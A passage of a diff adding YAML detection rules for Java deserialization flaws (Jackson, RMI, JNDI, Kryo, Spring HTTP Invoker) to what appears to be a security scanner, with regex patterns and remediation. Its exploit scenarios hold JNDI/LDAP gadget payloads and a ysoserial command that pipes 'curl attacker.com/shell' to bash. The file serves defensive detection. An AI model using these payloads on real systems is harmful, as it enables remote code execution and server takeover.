+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+      - "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
+    context_awareness:
+      surrounding_context_patterns:
+        - "ObjectMapper with enableDefaultTyping in configuration"
+        - "No PolymorphicTypeValidator configured"
+        - "readValue with generic type parameter"
+        - "@JsonTypeInfo with Id.CLASS"
+      taint_source_indicators:
+        - "HTTP request body"
+        - "REST API JSON payload"
+        - "WebSocket JSON message"
+        - "Kafka JSON message"
+        - "Redis JSON value"
+      taint_sink_indicators:
+        - "ObjectMapper.readValue()"
+        - "ObjectMapper.readTree()"
+        - "ObjectMapper.convertValue()"
+        - "ObjectReader.readValue()"
+      sanitization_patterns:
+        - "PolymorphicTypeValidator with allowIfSubType"
+        - "@JsonSubTypes annotation"
+        - "JsonTypeInfo.Id.NAME instead of CLASS"
+        - "Custom TypeResolverBuilder with validation"
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (type_validator_present ? 0.4 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Spring Boot REST API uses Jackson with enableDefaultTyping() for
+        flexible JSON handling. An attacker sends a JSON payload:
+        ["org.apache.xbean.propertyeditor.JndiConverter",
+         {"asText":"ldap://attacker.com:1389/Exploit"}]
+        Jackson deserializes this as a JndiConverter object, which triggers
+        a JNDI lookup to the attacker's LDAP server. The LDAP server
+        responds with a reference to a malicious class that gets loaded
+        and executed on the target server, achieving RCE.
+      example_payload: '["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}]'
+      attacker_objective: "Trigger JNDI-based RCE through Jackson polymorphic type handling with gadget classes"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-JAVA-001"
+        - "DESER-JAVA-003"
+        - "DESER-JAVA-006"
+
+  # ============================================================================
+  # DESER-JAVA-005: Java RMI Deserialization
+  # ============================================================================
+  - rule_id: "DESER-JAVA-005"
+    title: "Java RMI Deserialization Enabling Remote Code Execution"
+    description: >
+      Detects Java RMI (Remote Method Invocation) configurations and usage
+      patterns that expose deserialization attack surfaces. RMI uses Java
+      serialization for method parameter and return value transport. Both
+      RMI registries and remote object implementations accept serialized
+      Java objects, making them vulnerable to deserialization attacks via
+      gadget chains. Exposed RMI services on network interfaces are prime
+      targets for ysoserial attacks. RMI also supports distributed garbage
+      collection (DGC) which has its own deserialization attack surface.
+    language: java
+    category: deserialization
+    severity: Critical
+    confidence: 0.90
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - java
+      - rmi
+      - rce
+      - gadget-chain
+      - network
+      - critical
+    detection_layer: 1
+    attack_surface_type: "internal"
+    patterns:
+      - type: regex
+        pattern: 'LocateRegistry\.(createRegistry|getRegistry)\s*\('
+        description: "RMI registry creation or lookup"
+      - type: regex
+        pattern: 'UnicastRemoteObject\.exportObject\s*\('
+        description: "Exporting RMI remote object on network"
+      - type: regex
+        pattern: 'extends\s+UnicastRemoteObject'
+        description: "Class extending UnicastRemoteObject for RMI"
+      - type: regex
+        pattern: 'Naming\.(rebind|bind|lookup)\s*\('
+        description: "RMI naming operations"
+      - type: regex
+        pattern: 'registry\.(rebind|bind|lookup)\s*\('
+        description: "Direct registry binding/lookup operations"
+      - type: regex
+        pattern: 'java\.rmi\.(server|registry|Naming)'
+        description: "Import of Java RMI packages"
+      - type: regex
+        pattern: '-Djava\.rmi\.server\.hostname'
+        description: "RMI server hostname configuration"
+      - type: regex
+        pattern: 'RMISocketFactory|RMIServerSocketFactory'
+        description: "Custom RMI socket factory configuration"
+    anti_patterns:
+      - 'RMI.*localhost|RMI.*127\.0\.0\.1'
+      - 'LocateRegistry\.createRegistry\s*\(\s*\d+\s*\).*test'
+      - '@Test.*RMI'
+      - 'mock.*Registry'
+      - 'JMXServiceURL.*localhost'
+      - 'setObjectInputFilter.*RMI'
+      - 'RMI.*firewall'
+      - 'RMI.*internal.*only'
+      - 'RMI.*secured'
+      - 'RMI.*SSL|SslRMI'
+      - 'serialFilter.*RMI|RMI.*serialFilter'
+      - 'sun\.rmi\.registry\.registryFilter'
+    bypass_variants:
+      - description: "DGC-based deserialization attack"
+        pattern: 'sun\.rmi\.transport\.DGC'
+      - description: "RMI class loading from remote codebase"
+        pattern: 'java\.rmi\.server\.codebase|useCodebaseOnly\s*=\s*false'
+      - description: "JMX RMI connector exploitation"
+        pattern: 'JMXConnectorServer.*RMI|RMIConnectorServer'
+    evasion_indicators:
+      - "RMI registry exposed on public network interface"
+      - "RMI without JEP 290 deserialization filters"
+      - "DGC layer accessible for deserialization attacks"
+      - "Remote codebase loading enabled"
+      - "JMX over RMI without authentication"
+    encoding_variants:
+      - type: "custom_rmi_protocol"
+        pattern: 'rmi://[^/]+:\d+'
+      - type: "jmx_rmi"
+        pattern: 'service:jmx:rmi://[^/]+:\d+'
+      - type: "iiop"
+        pattern: 'iiop://[^/]+:\d+'
+    multi_function_chain_patterns:
+      - "RMI registry lookup -> method call with serialized parameter -> gadget chain -> RCE"
+      - "JMX RMI connect -> MLet MBean loading -> arbitrary code execution"
+      - "RMI DGC -> serialized object -> gadget chain -> command execution"
+      - "JRMP listener -> deserialization attack -> reverse shell"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "RMI uses Java serialization for all parameter passing; any exposed RMI endpoint is vulnerable to gadget chain attacks if the classpath contains exploitable libraries"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "RMI client method invocation"
+        sink: "RMI server method parameter deserialization"
+        through: "Java serialization over JRMP"
+      - source: "JMX RMI connection"
+        sink: "MBean server operations"
+        through: "JMX connector"
+      - source: "DGC lease message"
+        sink: "DGC deserialization"
+        through: "RMI transport layer"
+    impact: |
+      Java RMI deserialization vulnerabilities lead to:
+      - Remote Code Execution via gadget chains in method parameters
+      - Full server compromise through JMX MBean loading
+      - Network-level attacks through exposed RMI registries
+      - Lateral movement within internal networks
+      - Denial of Service through DGC flooding
+    remediation: |
+      1. Apply JEP 290 deserialization filters:
+         ```
+         -Dsun.rmi.registry.registryFilter=maxdepth=5;maxrefs=100;com.myapp.**
+         -Djdk.serialFilter=maxdepth=5;maxrefs=100;!*
+         ```
+      2. Restrict RMI to localhost or trusted networks:
+         ```java
+         Registry registry = LocateRegistry.createRegistry(1099,
+             new SslRMIClientSocketFactory(),
+             new SslRMIServerSocketFactory());
+         ```
+      3. Enable SSL/TLS for RMI communication.
+      4. Use firewall rules to restrict RMI port access.
+      5. Replace RMI with gRPC or REST for inter-service communication.
+    references:
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+      - "https://openjdk.org/jeps/290"
+      - "https://www.exploit-db.com/docs/english/46780-java-deserialization-rmi.pdf"
+    context_awareness:
+      surrounding_context_patterns:
+        - "RMI registry creation in server code"
+        - "Remote object export on network interface"
+        - "No JEP 290 serial filter configuration"
+        - "RMI bound to 0.0.0.0 or public IP"
+      taint_source_indicators:
+        - "RMI client connection"
+        - "JMX RMI connector"
+        - "JRMP protocol message"
+        - "DGC protocol message"
+      taint_sink_indicators:
+        - "Remote method parameter deserialization"
+        - "Registry.lookup() result cast"
+        - "MBean attribute deserialization"
+        - "DGC lease processing"
+      sanitization_patterns:
+        - "JEP 290 serialization filter"
+        - "SSL/TLS for RMI transport"
+        - "Network firewall restricting RMI ports"
+        - "RMI bound to localhost only"
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (public_network ? 1.5 : 0.8)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Java application exposes an RMI registry on port 1099 accessible
+        from the network. An attacker uses ysoserial's exploit/RMIRegistryExploit
+        to send a crafted serialized object to the registry:
+        java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit
+          target:1099 CommonsCollections1 'curl attacker.com/shell|bash'
+        The RMI registry deserializes the object, triggering the Commons
+        Collections gadget chain which executes the attacker's command.
+      example_payload: "ysoserial.exploit.RMIRegistryExploit target:1099 CommonsCollections1 'id'"
+      attacker_objective: "Exploit RMI deserialization to achieve remote code execution on servers exposing RMI services"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-JAVA-001"
+        - "DESER-JAVA-006"
+        - "DESER-JAVA-008"
+
+  # ============================================================================
+  # DESER-JAVA-006: JNDI Lookup in Deserialization Context
+  # ============================================================================
+  - rule_id: "DESER-JAVA-006"
+    title: "JNDI Lookup in Deserialization Context Enabling Remote Class Loading"
+    description: >
+      Detects JNDI (Java Naming and Directory Interface) lookup operations
+      triggered during or as part of deserialization flows. JNDI lookups
+      with user-controlled URLs can load remote Java classes from attacker-
+      controlled LDAP, RMI, or DNS servers. This attack vector was
+      prominently exploited in Log4Shell (CVE-2021-44228) and is a common
+      gadget chain terminal operation in Java deserialization exploits.
+      The combination of deserialization + JNDI lookup creates a powerful
+      attack primitive for loading and executing arbitrary remote code.
+    language: java
+    category: deserialization
+    severity: Critical
+    confidence: 0.94
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - java
+      - jndi
+      - ldap
+      - rmi
+      - log4shell
+      - remote-class-loading
+      - critical
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'InitialContext\s*\(\s*\)\.lookup\s*\(\s*(request\.|data|input|payload|url|name|param|user)'
+        description: "JNDI lookup with user-controlled name"
+      - type: regex
+        pattern: 'ctx\.lookup\s*\(\s*(request\.|data|input|payload|param|user|arg)'
+        description: "Context lookup with user-controlled parameter"
+      - type: regex
+        pattern: 'new\s+InitialContext\s*\([^)]*\)\.lookup\s*\(\s*["\x27](ldap|rmi|iiop|dns)://'
+        description: "JNDI lookup with URL-based reference"
+      - type: regex
+        pattern: 'JndiLookup|JndiCallback|JndiTemplate'
+        description: "JNDI helper classes that may process untrusted input"
+      - type: regex
+        pattern: 'NamingManager\.getObjectInstance\s*\('
+        description: "NamingManager.getObjectInstance which triggers class loading"
+      - type: regex
+        pattern: 'DirContext\s*\(\s*\)\.lookup\s*\(\s*(request|input|data|param|user)'
+        description: "Directory context lookup with user-controlled name"
+      - type: regex
+        pattern: 'ldap[s]?://\$\{|ldap[s]?://.*\+\s*(request|input|data|param|user)'
+        description: "LDAP URL constructed from user input"
+      - type: regex
+        pattern: 'rmi://\$\{|rmi://.*\+\s*(request|input|data|param|user)'
+        description: "RMI URL constructed from user input"
+    anti_patterns:
+      - 'ctx\.lookup\s*\(\s*["\x27]java:(comp|module|global)/'
+      - 'ctx\.lookup\s*\(\s*["\x27]jdbc/'
+      - 'ctx\.lookup\s*\(\s*["\x27]jms/'
+      - 'JNDI.*test|Test.*JNDI'
+      - '@Test.*lookup'
+      - 'mock.*Context'
+      - 'com\.sun\.jndi\.ldap\.object\.trustURLCodebase\s*=\s*false'
+      - 'com\.sun\.jndi\.rmi\.object\.trustURLCodebase\s*=\s*false'
+      - 'lookup\s*\(\s*["\x27][a-zA-Z]+["\x27]\s*\)'
+      - 'JNDI.*internal'
+      - 'lookup.*validated'
+      - 'lookup.*sanitized'
+      - 'lookup.*whitelist'
+    bypass_variants:
+      - description: "JNDI lookup with serialized reference object in LDAP response"
+        pattern: 'javaSerializedData|javaClassName|javaFactory'
+      - description: "JNDI via DNS CNAME chain to bypass URL restrictions"
+        pattern: 'dns://[^/]+/[^"]*'
+      - description: "Nested JNDI lookup through environmental variable"
+        pattern: 'System\.getenv\s*\([^)]*\).*lookup|lookup.*System\.getenv'
+    evasion_indicators:
+      - "JNDI URL constructed from string concatenation with user input"
+      - "LDAP/RMI URL in deserialized object properties"
+      - "Log4j pattern with JNDI substitution"
+      - "JNDI reference with remote codebase"
+      - "DNS-based JNDI to bypass URL scheme restrictions"
+    encoding_variants:
+      - type: "url_encoded_jndi"
+        pattern: '%24%7Bjndi%3A'
+      - type: "unicode_escaped"
+        pattern: '\\u0024\\u007bjndi'
+      - type: "nested_lookup"
+        pattern: '\\$\\{\\$\\{.*jndi'
+    multi_function_chain_patterns:
+      - "Log message -> log4j JNDI interpolation -> LDAP lookup -> remote class loading -> RCE"
+      - "HTTP header -> deserialization -> JndiConverter -> LDAP lookup -> code loading"
+      - "Jackson polymorphic -> JdbcRowSetImpl -> JNDI lookup -> RCE"
+      - "XStream -> ProcessBuilder (or) JNDI gadget -> command execution"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "JNDI lookups with attacker-controlled URLs can load remote class files from malicious LDAP/RMI servers, executing arbitrary code in the JVM"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "HTTP header (User-Agent, X-Forwarded-For)"
+        sink: "JNDI lookup"
+        through: "Log4j string interpolation"
+      - source: "HTTP request parameter"
+        sink: "InitialContext.lookup()"
+        through: "Direct parameter passing"
+      - source: "Deserialized object property"
+        sink: "JNDI lookup via setter method"
+        through: "Jackson/XStream property binding"
+    impact: |
+      JNDI lookup exploitation in deserialization context leads to:
+      - Remote Code Execution through remote class loading from attacker LDAP/RMI
+      - Supply chain compromise through malicious class injection
+      - Full server compromise as seen in Log4Shell
+      - Lateral movement and infrastructure-wide attacks
+      - Data exfiltration through DNS JNDI lookups
+    remediation: |
+      1. Disable remote JNDI lookups via system properties:
+         ```
+         -Dcom.sun.jndi.ldap.object.trustURLCodebase=false
+         -Dcom.sun.jndi.rmi.object.trustURLCodebase=false
+         -Dlog4j2.formatMsgNoLookups=true
+         ```
+      2. Never pass user input to JNDI lookup:
+         ```java
+         // Bad: user input in JNDI lookup
+         ctx.lookup(request.getParameter("resource"));
+
+         // Good: whitelist JNDI names
+         String name = ALLOWED_JNDI_NAMES.get(request.getParameter("resource"));
+         if (name != null) { ctx.lookup(name); }
+         ```
+      3. Upgrade Log4j to 2.17.1+ and disable JNDI lookups.
+      4. Use Java 11.0.1+, 8u191+ where remote codebase is disabled by default.
+      5. Implement egress firewall rules to block outbound LDAP/RMI connections.
+    references:
+      - "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+      - "https://logging.apache.org/log4j/2.x/security.html"
+    context_awareness:
+      surrounding_context_patterns:
+        - "JNDI InitialContext in same file"
+        - "User-controlled string in lookup parameter"
+        - "LDAP or RMI URL construction with user input"
+        - "No URL scheme or host validation"
+      taint_source_indicators:
+        - "request.getParameter()"
+        - "request.getHeader()"
+        - "log message containing user input"
+        - "deserialized object property"
+        - "database field value"
+      taint_sink_indicators:
+        - "InitialContext.lookup()"
+        - "DirContext.lookup()"
+        - "JndiTemplate.lookup()"
+        - "NamingManager.getObjectInstance()"
+      sanitization_patterns:
+        - "JNDI name whitelist"
+        - "URL scheme restriction (java:comp only)"
+        - "trustURLCodebase=false"
+        - "Egress firewall blocking LDAP/RMI"
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (remote_codebase_enabled ? 1.5 : 0.8)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Java application accepts JSON input via a REST API. The Jackson
+        ObjectMapper has enableDefaultTyping() configured. An attacker sends:
+        ["com.sun.rowset.JdbcRowSetImpl",
+         {"dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}]
+        Jackson deserializes this as a JdbcRowSetImpl object and calls
+        setDataSourceName, which triggers a JNDI lookup to the attacker's
+        LDAP server. The LDAP server responds with a Java Reference pointing
+        to a malicious class hosted on attacker.com. The JVM loads and
+        executes the class, giving the attacker full code execution.
+      example_payload: '${jndi:ldap://attacker.com:1389/Exploit}'
+      attacker_objective: "Load and execute remote Java classes through JNDI injection triggered by deserialization"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-JAVA-001"
+        - "DESER-JAVA-004"
+        - "DESER-JAVA-005"
+
+  # ============================================================================
+  # DESER-JAVA-007: Kryo Deserialization Without Whitelist
+  # ============================================================================
+  - rule_id: "DESER-JAVA-007"
+    title: "Kryo Deserialization Without Class Registration Whitelist"
+    description: >
+      Detects usage of Kryo deserialization framework without class
+      registration requirements. By default, Kryo allows deserialization
+      of any class and does not require prior registration. When
+      setRegistrationRequired(false) is used or registration is not
+      enforced, an attacker can supply serialized data containing
+      arbitrary classes, including gadget chain classes that lead to
+      remote code execution. Kryo is used extensively in Apache Spark,
+      Storm, Hive, and other big data frameworks.
+    language: java
+    category: deserialization
+    severity: High
+    confidence: 0.89
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - java
+      - kryo
+      - rce
+      - big-data
+      - spark
+      - critical
+      - registration
+    detection_layer: 2
+    attack_surface_type: "internal"
+    patterns:
+      - type: regex
+        pattern: 'kryo\.setRegistrationRequired\s*\(\s*false\s*\)'
+        description: "Kryo with registration requirement explicitly disabled"
+      - type: regex
+        pattern: 'kryo\.readObject\s*\(\s*(input|stream|data|payload|buffer)'
+        description: "Kryo readObject on potentially untrusted input"
+      - type: regex
+        pattern: 'kryo\.readClassAndObject\s*\(\s*(input|stream|data|payload|buffer)'
+        description: "Kryo readClassAndObject allowing arbitrary class deserialization"
+      - type: regex
+        pattern: 'new\s+Kryo\s*\(\s*\)(?!.*setRegistrationRequired\s*\(\s*true)'
+        description: "Kryo instantiation without enabling registration requirement"
+      - type: regex
+        pattern: 'Input\s*\(\s*new\s+ByteArrayInputStream\s*\(\s*(data|payload|body|bytes|content)'
+        description: "Kryo Input wrapping untrusted byte data"
+      - type: regex
+        pattern: 'KryoPool.*readClassAndObject'
+        description: "Kryo from pool reading arbitrary objects"
+      - type: regex
+        pattern: 'KryoSerializer|KryoSerializeable'
+        description: "Kryo serializer implementation that may lack restrictions"
+    anti_patterns:
+      - 'kryo\.setRegistrationRequired\s*\(\s*true\s*\)'
+      - 'kryo\.register\s*\(\s*[A-Z]'
+      - '@Test.*kryo'
+      - 'mock.*Kryo'
+      - 'kryo.*test'
+      - 'kryo\.readObject\s*\(\s*\w+\s*,\s*[A-Z][a-zA-Z]+\.class\s*\)'
+      - 'KryoException'
+      - 'registration.*required'
+      - 'kryo.*trusted'
+      - 'kryo.*internal'
+      - 'DefaultSerializer.*Kryo.*register'
+      - 'kryo\.setReferences\s*\(\s*false\s*\).*setRegistrationRequired.*true'
+    bypass_variants:
+      - description: "Kryo with CompatibleFieldSerializer allowing class structure changes"
+        pattern: 'CompatibleFieldSerializer|VersionFieldSerializer'
+      - description: "Custom Kryo serializer with unsafe instantiation"
+        pattern: 'extends\s+Serializer.*read\s*\(.*Kryo.*Input'
+      - description: "Kryo instantiation strategy using sun.misc.Unsafe"
+        pattern: 'StdInstantiatorStrategy|Objenesis'
+    evasion_indicators:
+      - "Kryo configured without registration requirement"
+      - "readClassAndObject allowing arbitrary type instantiation"
+      - "Custom instantiation strategy bypassing constructors"
+      - "KryoPool sharing unregistered Kryo instances"
+      - "StdInstantiatorStrategy using Unsafe"
+    encoding_variants:
+      - type: "base64_kryo"
+        pattern: 'Base64\.decode.*Kryo.*Input'
+      - type: "compressed_kryo"
+        pattern: '(GZIPInputStream|SnappyInputStream|LZ4BlockInputStream).*Kryo'
+      - type: "hex_kryo"
+        pattern: 'Hex\.decode.*Kryo.*Input'
+    multi_function_chain_patterns:
+      - "Spark RPC -> Kryo deserialization -> gadget chain -> RCE on executor"
+      - "Akka message -> Kryo serializer -> arbitrary class instantiation"
+      - "Flink state backend -> Kryo deserialization -> object injection"
+      - "Storm topology -> TupleImpl -> Kryo deserialization -> code execution"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Kryo without registration allows arbitrary class deserialization, enabling gadget chain exploits in distributed computing frameworks"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "Network message / RPC call"
+        sink: "Kryo.readClassAndObject()"
+        through: "Custom protocol handler"
+      - source: "Serialized state from storage"
+        sink: "Kryo.readObject()"
+        through: "State restoration"
+      - source: "Inter-node communication data"
+        sink: "Kryo deserialization"
+        through: "Distributed framework serializer"
+    impact: |
+      Unrestricted Kryo deserialization can lead to:
+      - Remote Code Execution on cluster nodes (Spark, Storm, Flink)
+      - Arbitrary class instantiation bypassing constructors via Objenesis
+      - Denial of Service through resource-intensive object graphs
+      - Lateral movement in distributed computing clusters
+      - Data exfiltration from big data processing pipelines
+    remediation: |
+      1. Enable Kryo registration requirement:
+         ```java
+         Kryo kryo = new Kryo();
+         kryo.setRegistrationRequired(true);
+         kryo.register(AllowedClass1.class);
+         kryo.register(AllowedClass2.class);
+         ```
+      2. Use readObject with explicit class instead of readClassAndObject:
+         ```java
+         // Bad: allows arbitrary class
+         Object obj = kryo.readClassAndObject(input);
+
+         // Good: restricts to expected type
+         MyClass obj = kryo.readObject(input, MyClass.class);
+         ```
+      3. Configure Spark to use safe serialization:
+         ```
+         spark.serializer=org.apache.spark.serializer.JavaSerializer
+         spark.kryo.registrationRequired=true
+         ```
+      4. Implement custom Kryo serializers with type validation.
+      5. Use network segmentation to protect distributed framework communication.
+    references:
+      - "https://github.com/EsotericSoftware/kryo"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+    context_awareness:
+      surrounding_context_patterns:
+        - "Kryo import and instantiation"
+        - "No setRegistrationRequired(true)"
+        - "readClassAndObject on untrusted input"
+        - "Distributed framework serializer configuration"
+      taint_source_indicators:
+        - "Network socket data"
+        - "RPC message payload"
+        - "Distributed framework message"
+        - "Stored serialized state"
+        - "Inter-node communication"
+      taint_sink_indicators:
+        - "Kryo.readObject()"
+        - "Kryo.readClassAndObject()"
+        - "KryoSerializer.deserialize()"
+      sanitization_patterns:
+        - "setRegistrationRequired(true)"
+        - "Explicit class registration"
+        - "readObject with class parameter"
+        - "Custom serializer with type validation"
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (registration_required ? 0.3 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        An Apache Spark cluster uses Kryo for serialization with
+        registrationRequired=false. An attacker with access to the Spark
+        driver network submits a crafted Kryo-serialized payload through
+        the Spark RPC framework. The payload contains a gadget chain that
+        leverages classes available on the Spark classpath (such as
+        commons-collections) to execute arbitrary commands on executor
+        nodes. The attacker gains code execution on all nodes processing
+        the malicious data, compromising the entire cluster.
+      example_payload: "Kryo serialized object with CommonsCollections gadget chain targeting readClassAndObject"
+      attacker_objective: "Exploit unrestricted Kryo deserialization to execute code on distributed computing cluster nodes"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-JAVA-001"
+        - "DESER-JAVA-004"
+
+  # ============================================================================
+  # DESER-JAVA-008: Spring HTTP Invoker Deserialization
+  # ============================================================================
+  - rule_id: "DESER-JAVA-008"
+    title: "Spring HTTP Invoker Deserialization Enabling Remote Code Execution"
+    description: >
+      Detects usage of Spring's HTTP Invoker (HttpInvokerServiceExporter,
+      HttpInvokerProxyFactoryBean) which uses Java serialization to transport
+      method invocations over HTTP. The HttpInvokerServiceExporter deserializes
+      incoming HTTP request bodies as Java objects, making it directly
+      vulnerable to gadget chain attacks. Similarly, the
+      RemoteInvocationSerializingExporter and other Spring Remoting
+      components that use Java serialization are vulnerable. Spring
+      officially recommends against using HTTP Invoker with untrusted
+      clients due to the inherent deserialization risks.
+    language: java
+    category: deserialization
+    severity: High
+    confidence: 0.93
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - java
+      - spring
+      - http-invoker
+      - rce
+      - spring-remoting
+      - critical
+    detection_layer: 1
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'HttpInvokerServiceExporter'
+        description: "Spring HTTP Invoker service exporter bean"
+      - type: regex
+        pattern: 'HttpInvokerProxyFactoryBean'
+        description: "Spring HTTP Invoker proxy bean (client-side)"
+      - type: regex
+        pattern: 'RemoteInvocationSerializingExporter'
+        description: "Base class for serialization-based remoting exporters"
+      - type: regex
+        pattern: 'RmiServiceExporter'
+        description: "Spring RMI service exporter using Java serialization"
+      - type: regex
+        pattern: 'org\.springframework\.remoting\.(httpinvoker|rmi|caucho)'
+        description: "Spring remoting packages using serialization"
+      - type: regex
+        pattern: 'SimpleHttpInvokerRequestExecutor|CommonsHttpInvokerRequestExecutor'
+        description: "HTTP Invoker request executors"
+      - type: regex
+        pattern: '@Bean.*HttpInvokerServiceExporter'
+        description: "Spring Bean definition for HTTP Invoker exporter"
+      - type: regex
+        pattern: '<bean\s+class\s*=\s*"org\.springframework\.remoting\.httpinvoker\.HttpInvokerServiceExporter"'
+        description: "XML bean definition for HTTP Invoker"
+    anti_patterns:
+      - 'HttpInvokerServiceExporter.*test|Test.*HttpInvokerServiceExporter'
+      - '@Test.*httpInvoker'
+      - 'mock.*HttpInvoker'
+      - 'HttpInvokerServiceExporter.*deprecated'
+      - '#.*TODO.*remove.*HttpInvoker'
+      - 'HttpInvokerServiceExporter.*internal'
+      - 'HttpInvokerServiceExporter.*localhost'
+      - 'ObjectInputFilter.*HttpInvoker'
+      - 'setObjectInputFilter.*remoting'
+      - 'HttpInvokerServiceExporter.*disabled'
+      - 'HttpInvokerServiceExporter.*secured'
+      - '\/\/\s*@deprecated.*HttpInvoker'
+    bypass_variants:
+      - description: "Custom RemoteInvocationSerializingExporter subclass"
+        pattern: 'extends\s+RemoteInvocationSerializingExporter'
+      - description: "Custom HTTP Invoker request executor without filtering"
+        pattern: 'extends\s+(Simple|CommonsHttp)HttpInvokerRequestExecutor'
+      - description: "Spring Cloud function using serialization remoting"
+        pattern: 'spring\.cloud.*remoting|FunctionInvoker.*serializ'
+    evasion_indicators:
+      - "HTTP Invoker exposed on public endpoint"
+      - "No authentication on invoker endpoint"
+      - "Java serialization content type in HTTP headers"
+      - "Custom exporter without object input filtering"
+      - "Legacy Spring XML configuration with invoker beans"
+    encoding_variants:
+      - type: "serialized_http"
+        pattern: 'Content-Type\s*:\s*application/x-java-serialized-object'
+      - type: "gzip_serialized"
+        pattern: 'Content-Encoding\s*:\s*gzip.*application/x-java-serialized-object'
+      - type: "base64_payload"
+        pattern: 'Base64\.decode.*RemoteInvocation'
+    multi_function_chain_patterns:
+      - "HTTP POST -> HttpInvokerServiceExporter -> ObjectInputStream -> gadget chain -> RCE"
+      - "Spring Cloud -> HTTP Invoker -> deserialization -> method invocation"
+      - "Microservice -> RMI exporter -> Java serialization -> gadget -> RCE"
+      - "Legacy endpoint -> HTTP Invoker -> RemoteInvocation -> arbitrary method call"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Spring HTTP Invoker endpoints accept arbitrary serialized Java objects over HTTP, enabling direct gadget chain exploitation without authentication"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "HTTP POST body (serialized Java object)"
+        sink: "HttpInvokerServiceExporter.handleRequest()"
+        through: "DispatcherServlet URL mapping"
+      - source: "RMI client invocation"
+        sink: "RmiServiceExporter deserialization"
+        through: "Spring RMI transport"
+      - source: "HTTP Invoker proxy call"
+        sink: "Remote service deserialization"
+        through: "HTTP transport with Java serialization"
+    impact: |
+      Spring HTTP Invoker deserialization leads to:
+      - Remote Code Execution via gadget chains over HTTP
+      - No authentication required for exploitation in default configuration
+      - Full server compromise with web application privileges
+      - Data exfiltration from Spring application context (databases, services)
+      - Lateral movement to other microservices
+      - Supply chain risk through transitive Spring dependencies
+    remediation: |
+      1. Remove Spring HTTP Invoker and migrate to REST/JSON:
+         ```java
+         // Bad: Spring HTTP Invoker
+         @Bean("/api/service")
+         HttpInvokerServiceExporter exporter() {
+             HttpInvokerServiceExporter exporter = new HttpInvokerServiceExporter();
+             exporter.setService(myService);
+             exporter.setServiceInterface(MyService.class);
